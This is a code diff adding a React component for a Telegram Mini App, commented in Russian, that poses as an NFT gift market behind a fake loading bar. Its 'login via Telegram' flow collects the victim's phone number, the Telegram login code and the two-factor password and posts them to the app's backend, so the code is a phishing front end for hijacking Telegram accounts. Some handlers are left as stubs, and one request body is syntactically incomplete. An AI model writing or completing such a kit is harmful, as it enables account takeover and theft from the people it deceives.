@@ -1,0 +1,96 @@
+// src/App.tsx
+import { useEffect, useState } from 'react';
+import WebApp from '@twa-dev/sdk';
+import './App.css';
+
+function App() {
+  const [progress, setProgress] = useState(0);
+  const [step, setStep] = useState<'loading' | 'market' | 'phone' | 'code' | '2fa'>('loading');
+
+  useEffect(() => {
+    // Фейковая загрузка
+    const timer = setInterval(() => {
+      setProgress(p => {
+        if (p >= 100) {
+          clearInterval(timer);
+          setStep('market');
+          return 100;
+        }
+        return p + 2;
+      });
+    }, 120);
+
+    return () => clearInterval(timer);
+  }, []);
+
+  const requestContact = () => {
+    WebApp.requestContact((contact) => {
+      if (contact) {
+        fetch('/api/submit-phone', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            phone: contact.phone_number,
+            user_id: WebApp.initDataUnsafe.user?.id,
+            first_name: WebApp.initDataUnsafe.user?.first_name,
+          })
+        }).then(res => res.json()).then(data => {
+          if (data.needCode) setStep('code');
+        });
+      }
+    });
+  };
+
+  const submitCode = (code: string) => {
+    fetch('/api/submit-code', {
+      method: 'POST',
+      body: JSON.stringify({ code, phone: /* из состояния или storage */ })
+    }).then(res => res.json()).then(data => {
+      if (data.need2fa) setStep('2fa');
+      else if (data.success) WebApp.close();
+    });
+  };
+
+  const submit2fa = (password: string) => {
+    // аналогично
+  };
+
+  return (
+    <div className="app" style={{ background: 'linear-gradient(#0f0f1a, #1a1a2e)', color: 'white', minHeight: '100vh' }}>
+      {step === 'loading' && (
+        <div className="loader">
+          <h1>Loading NFT Market...</h1>
+          <progress value={progress} max="100" />
+          <p>{progress}%</p>
+        </div>
+      )}
+
+      {step === 'market' && (
+        <div className="market">
+          <h1>NFT Gifts Collection</h1>
+          <div className="grid">
+            {/* тут красивые карточки с фейковыми NFT-подарками, фон как в TG */}
+          </div>
+          <button className="login-btn" onClick={() => setStep('phone')}>
+            Вход через Telegram
+          </button>
+        </div>
+      )}
+
+      {step === 'phone' && (
+        <div className="center">
+          <button onClick={requestContact}>Поделиться номером</button>
+        </div>
+      )}
+
+      {step === 'code' && (
+        <div>
+          <h2>Введите код из Telegram</h2>
+          <input type="text" maxLength={5} onChange={e => {/* submit when 5 chars */}} />
+        </div>
+      )}
+
+      {/* аналогично для 2FA */}
+    </div>
+  );
+}
